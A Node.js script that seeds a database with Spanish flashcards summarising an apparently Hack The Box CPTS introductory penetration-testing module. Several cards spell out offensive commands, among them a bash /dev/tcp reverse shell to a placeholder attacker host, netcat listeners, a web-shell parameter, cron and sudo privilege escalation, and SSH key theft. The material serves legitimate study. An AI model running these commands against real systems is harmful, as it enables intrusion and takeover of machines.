const fs = require('fs');
const path = require('path');
require('dotenv').config({ path: path.join(__dirname, '.env') });
const { getPool, initializeDatabase } = require('./database/db');

const MODULE_CARDS = [
  {
    concept_name: "El objetivo de Information Security (Infosec) y la tríada CIA",
    content: "Infosec es la práctica de proteger datos contra accesos no autorizados. Su pilar es la tríada CIA: Confidencialidad (Confidentiality), Integridad (Integrity) y Disponibilidad (Availability) de la información.",
    topic: "2) Getting Started",
    author: "Hack The Box (CPTS)",
    category: "Infosec Overview"
  },
  {
    concept_name: "Risk Management Process (Proceso de Gestión de Riesgos)",
    content: "Consta de 5 pasos: 1) Identificar el riesgo, 2) Analizar el riesgo (impacto/probabilidad), 3) Evaluar y priorizar (aceptar, evitar, mitigar o transferir), 4) Tratar/Lidiar con el riesgo, y 5) Monitorear constantemente.",
    topic: "2) Getting Started",
    author: "Hack The Box (CPTS)",
    category: "Infosec Overview"
  },
  {
    concept_name: "Red Team vs. Blue Team",
    content: "Red Team: Asume el rol de atacante simulando adversarios para encontrar debilidades y poner a prueba las defensas. Blue Team: Es el equipo defensor encargado de mitigar riesgos, crear políticas y responder a incidentes.",
    topic: "2) Getting Started",
    author: "Hack The Box (CPTS)",
    category: "Infosec Overview"
  },
  {
    concept_name: "Hypervisor y Máquinas Virtuales (VMs) en Pentesting",
    content: "El hypervisor es un software que permite crear VMs. Usar VMs aísla nuestra red principal de entornos vulnerables (como HTB) y evita dejar herramientas y evidencias sensibles en la máquina anfitriona.",
    topic: "2) Getting Started",
    author: "Hack The Box (CPTS)",
    category: "Basic Concepts"
  },
  {
    concept_name: "Conexión mediante VPN (Virtual Private Network)",
    content: "Canal cifrado para conectarse de forma segura a redes privadas. En HTB se usa OpenVPN (`sudo openvpn user.ovpn`). Si es exitoso, crea un adaptador virtual (ej. `tun0`) visible con `ifconfig`.",
    topic: "2) Getting Started",
    author: "Hack The Box (CPTS)",
    category: "Networking & VPN"
  },
  {
    concept_name: "¿Qué es una Shell?",
    content: "Programa que toma la entrada del usuario por teclado y envía comandos al sistema operativo para su ejecución. En Linux, el shell más común es Bash (Bourne Again Shell).",
    topic: "2) Getting Started",
    author: "Hack The Box (CPTS)",
    category: "Basic Concepts"
  },
  {
    concept_name: "Puertos (Ports) - Diferencia TCP vs UDP",
    content: "Puntos virtuales de conexión. TCP (Transmission Control Protocol) requiere 'handshake' previo, garantiza la entrega. UDP (User Datagram Protocol) envía sin conexión previa, más rápido pero sin garantía de entrega. Existen 65535 puertos.",
    topic: "2) Getting Started",
    author: "Hack The Box (CPTS)",
    category: "Networking & VPN"
  },
  {
    concept_name: "Basic Tools: SSH (Secure Shell) y Tmux",
    content: "SSH (Port 22) permite login remoto seguro (puede usar passwords o pares de llaves pública/privada). Tmux es un multiplexor de terminal para tener múltiples ventanas dentro de una misma consola.",
    topic: "2) Getting Started",
    author: "Hack The Box (CPTS)",
    category: "Basic Tools"
  },
  {
    concept_name: "Basic Tools: Netcat (nc)",
    content: "Herramienta de red tipo navaja suiza para interactuar con puertos TCP/UDP. Usos: conectar a servicios (Banner Grabbing), levantar Listeners para recibir shells (`nc -lvnp 1234`) y transferir archivos.",
    topic: "2) Getting Started",
    author: "Hack The Box (CPTS)",
    category: "Basic Tools"
  },
  {
    concept_name: "Service Scanning con Nmap",
    content: "Escaneo automatizado de los 65535 puertos para identificar servicios en ejecución. Banderas comunes: `-sV` (identificar versiones) y `-sC` (ejecutar scripts por defecto).",
    topic: "2) Getting Started",
    author: "Hack The Box (CPTS)",
    category: "Enumeration"
  },
  {
    concept_name: "Banner Grabbing y Conceptos de FTP/SMB",
    content: "Banner Grabbing: Leer la respuesta inicial de un servicio para identificarlo. FTP (Port 21) suele permitir acceso 'anonymous' con datos interesantes. SMB (Port 445) puede exponer shares e información en Windows.",
    topic: "2) Getting Started",
    author: "Hack The Box (CPTS)",
    category: "Enumeration"
  },
  {
    concept_name: "Web Enumeration: Directory Busting con Gobuster",
    content: "Búsqueda activa de archivos y carpetas ocultas (no listadas) en servidores web usando diccionarios (como SecLists). Comandos como `gobuster dir -u http://ip/ -w wordlist.txt`.",
    topic: "2) Getting Started",
    author: "Hack The Box (CPTS)",
    category: "Web Enumeration"
  },
  {
    concept_name: "Web Enumeration: Whatweb, robots.txt y Código Fuente",
    content: "Whatweb identifica CMS y frameworks. `robots.txt` le dice a los buscadores qué no indexar, revelando rutas ocultas. Ver el código fuente (`Ctrl+U`) puede revelar credenciales o comentarios dejados por devs.",
    topic: "2) Getting Started",
    author: "Hack The Box (CPTS)",
    category: "Web Enumeration"
  },
  {
    concept_name: "Búsqueda de Exploits Públicos (Searchsploit)",
    content: "Herramienta en línea de comandos para buscar vulnerabilidades en la base de datos de Exploit-DB (ej. `searchsploit openssh 7.2`). Útil tras identificar la versión de un servicio.",
    topic: "2) Getting Started",
    author: "Hack The Box (CPTS)",
    category: "Exploitation"
  },
  {
    concept_name: "Metasploit Framework (MSF) Básico",
    content: "Entorno de explotación con payloads integrados. Se lanza con `msfconsole`. Flujo básico: `search`, `use`, `show options`, `set RHOSTS`, `set LHOST`, `exploit`. Devuelve usualmente una sesión de Meterpreter.",
    topic: "2) Getting Started",
    author: "Hack The Box (CPTS)",
    category: "Exploitation"
  },
  {
    concept_name: "Tipos de Shell: Reverse Shell",
    content: "El objetivo comprometido inicia la conexión hacia nuestro equipo atacante. Nosotros configuramos un listener (`nc -lvnp 1234`) y el objetivo envía la shell (ej. `bash -i >& /dev/tcp/atacante/1234 0>&1`).",
    topic: "2) Getting Started",
    author: "Hack The Box (CPTS)",
    category: "Shells"
  },
  {
    concept_name: "Tipos de Shell: Bind Shell y Web Shell",
    content: "Bind Shell: El atacante abre un puerto de escucha en el servidor comprometido y luego se conecta a él. Web Shell: Script (ej. PHP, ASPX) inyectado en el servidor que ejecuta comandos a través de parámetros HTTP (`?cmd=id`).",
    topic: "2) Getting Started",
    author: "Hack The Box (CPTS)",
    category: "Shells"
  },
  {
    concept_name: "Estabilización de Shell (Upgrading TTY)",
    content: "Las shells básicas vía Netcat (dumb shells) no tienen historial ni atajos. Se mejoran con Python (`python3 -c 'import pty; pty.spawn(\"/bin/bash\")'`), luego pausando con `Ctrl+Z`, y ejecutando `stty raw -echo; fg`.",
    topic: "2) Getting Started",
    author: "Hack The Box (CPTS)",
    category: "Shells"
  },
  {
    concept_name: "Privilege Escalation (PrivEsc)",
    content: "Acción de elevar privilegios desde un usuario estándar a Administrador (root / SYSTEM). Se requiere enumerar el sistema localmente con listas de verificación manuales o scripts automatizados (como LinPEAS).",
    topic: "2) Getting Started",
    author: "Hack The Box (CPTS)",
    category: "Privilege Escalation"
  },
  {
    concept_name: "PrivEsc: Sudo y permisos NOPASSWD",
    content: "Sudo permite ejecutar comandos como otro usuario. Si se halla un permiso `NOPASSWD` en `sudo -l`, el usuario atacado puede ejecutar archivos como root sin conocer la contraseña (ej. un script propio inyectado).",
    topic: "2) Getting Started",
    author: "Hack The Box (CPTS)",
    category: "Privilege Escalation"
  },
  {
    concept_name: "PrivEsc: Tareas programadas (Cron Jobs)",
    content: "Si un script se ejecuta periódicamente como root (vía cronjob) y tenemos permisos de escritura sobre ese archivo o sobre la ruta desde donde se llama, podemos inyectar un comando para obtener una Reverse Shell de root.",
    topic: "2) Getting Started",
    author: "Hack The Box (CPTS)",
    category: "Privilege Escalation"
  },
  {
    concept_name: "PrivEsc: Robo y Abuso de SSH Keys",
    content: "Al encontrar una clave privada (id_rsa) de otro usuario (ej. root) y con permisos `chmod 600 id_rsa`, podemos acceder remotamente. También, si escribimos en `authorized_keys`, podemos inyectar nuestra llave pública.",
    topic: "2) Getting Started",
    author: "Hack The Box (CPTS)",
    category: "Privilege Escalation"
  },
  {
    concept_name: "Transferencia de Archivos: Wget, cURL y Python Server",
    content: "En el atacante levantamos `python3 -m http.server 8000`. En la víctima descargamos usando `wget http://IP:8000/archivo` o `curl http://IP:8000/archivo -o archivo`.",
    topic: "2) Getting Started",
    author: "Hack The Box (CPTS)",
    category: "File Transfers"
  },
  {
    concept_name: "Transferencia de Archivos: Método Base64",
    content: "Cuando hay cortafuegos muy restrictivos, se codifica el archivo binario (`base64 archivo -w 0`), se copia el texto crudo resultante, y en la víctima se decodifica en un nuevo archivo (`echo texto_b64 | base64 -d > archivo`).",
    topic: "2) Getting Started",
    author: "Hack The Box (CPTS)",
    category: "File Transfers"
  },
  {
    concept_name: "Validación de Integridad en Archivos Transferidos",
    content: "Para confirmar que el binario llegó sano, se usa `file nombre_archivo` (para confirmar su tipo, ej. ELF) y `md5sum nombre_archivo` para verificar que los hash originen coincidan antes y después de transferir.",
    topic: "2) Getting Started",
    author: "Hack The Box (CPTS)",
    category: "File Transfers"
  }
];

async function importData() {
  try {
    await initializeDatabase();
    const db = getPool();

    // Obtener los usuarios existentes para inyectarles las tarjetas
    const [users] = await db.execute('SELECT id, username FROM users');
    if (!users || users.length === 0) {
      console.error('⚠️ No se encontraron usuarios en la tabla users.');
      process.exit(1);
    }

    const todayStr = new Date().toISOString().split('T')[0];
    let insertedCount = 0;

    for (const user of users) {
      for (const card of MODULE_CARDS) {
        await db.execute(
          `INSERT INTO cybersecurity_cards 
            (user_id, concept_name, content, topic, author, category, next_review) 
           VALUES (?, ?, ?, ?, ?, ?, ?)`,
          [
            user.id,
            card.concept_name,
            card.content,
            card.topic,
            card.author,
            card.category,
            todayStr
          ]
        );
        insertedCount++;
      }
    }

    console.log(`✅ Inyectadas ${insertedCount} tarjetas de Ciberseguridad (Módulo 2: Getting Started) para ${users.length} usuario(s).`);
    process.exit(0);
  } catch (error) {
    console.error('❌ Error inyectando tarjetas de ciberseguridad:', error);
    process.exit(1);
  }
}

importData();
